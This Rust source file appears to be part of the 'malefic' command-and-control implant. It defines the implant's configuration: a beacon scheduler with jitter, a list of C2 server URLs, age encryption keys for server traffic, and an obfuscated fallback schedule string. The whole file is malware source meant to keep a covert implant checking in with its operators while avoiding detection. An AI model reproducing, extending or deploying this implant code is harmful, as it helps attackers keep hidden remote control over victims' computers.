use obfstr::obfstr;
use malefic_core::config;
use malefic_core::config::{CRON, JITTER};
use malefic_proto::scheduler::CronScheduler;
#[allow(dead_code)]
use malefic_helper::debug;

pub struct MetaConfig {
    uuid: [u8; 4],
    pub scheduler: CronScheduler,  // interval scheduler
    pub urls: Vec<String>,
    #[cfg(feature = "secure")]
    pub private_key: String,  // private_key for implant，for decode server's data
    #[cfg(feature = "secure")]
    pub server_public_key: String,  // public_key for server，encode data to server
}

impl MetaConfig {
    pub fn new(uuid: [u8; 4]) -> Self {
        let scheduler = CronScheduler::new(&CRON, *JITTER)
            .unwrap_or_else(|_| {
                CronScheduler::new(&*obfstr!("*/5 * * * * * *").to_string(), *JITTER).unwrap()
            });

        MetaConfig {
            uuid,
            #[cfg(feature = "secure")]
            private_key: malefic_core::config::AGE_PRIVATE_KEY.clone(),
            #[cfg(feature = "secure")]
            server_public_key: malefic_core::config::AGE_PUBLIC_KEY.clone(),
            scheduler,
            urls: config::SERVER_CONFIGS.iter().map(|cfg| cfg.address.clone()).collect(),
        }
    }

    pub fn set_id(&mut self, uuid: [u8; 4]) {
        self.uuid = uuid;
    }

    pub fn update_schedule(&mut self, expression: &str, jitter: f64) -> anyhow::Result<()> {
        self.scheduler = CronScheduler::new(expression, jitter)
            .map_err(|e| anyhow::anyhow!("Failed to create scheduler: {}", e))?;
        Ok(())
    }

    pub fn update_urls(&mut self, urls: Vec<String>) {
        self.urls = urls;
    }

    pub fn new_heartbeat(&self) -> u64 {
        self.scheduler.next_interval()
    }

    pub fn new_heartbeat_without_jitter(&self) -> u64 {
        self.scheduler.next_interval()
    }

    pub fn get_uuid(&self) -> [u8; 4] {
        self.uuid
    }

    pub fn is_active_now(&self) -> bool {
        self.scheduler.is_active_now()
    }

    #[allow(dead_code)]
    pub fn get_schedule_expression(&self) -> String {
        self.scheduler.expression()
    }

    /// Get implant's private key for decrypting server data
    #[allow(dead_code)]
    pub fn get_decrypt_key(&self) -> Option<&str> {
        #[cfg(feature = "secure")]
        {
            if self.private_key.is_empty() {
                None
            } else {
                debug!("get decrypt key: {}", self.private_key);
                Some(&self.private_key)
            }
        }
        #[cfg(not(feature = "secure"))]
        {
            None
        }
    }

    /// Get server's public key for encrypting data to server
    pub fn get_encrypt_key(&self) -> Option<&str> {
        #[cfg(feature = "secure")]
        {
            if self.server_public_key.is_empty() {
                None
            } else {
                Some(&self.server_public_key)
            }
        }
        #[cfg(not(feature = "secure"))]
        {
            None
        }
    }

}
